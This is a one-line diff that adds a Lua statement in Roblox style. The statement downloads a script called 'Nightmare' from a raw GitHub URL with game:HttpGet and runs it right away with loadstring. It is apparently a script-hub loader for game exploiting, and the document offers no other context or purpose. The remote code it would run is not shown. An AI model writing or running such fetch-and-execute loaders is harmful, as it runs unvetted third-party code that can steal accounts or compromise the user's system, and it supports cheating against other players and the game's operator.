@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Manny72911/Nightmare/main/nightmare",true))();
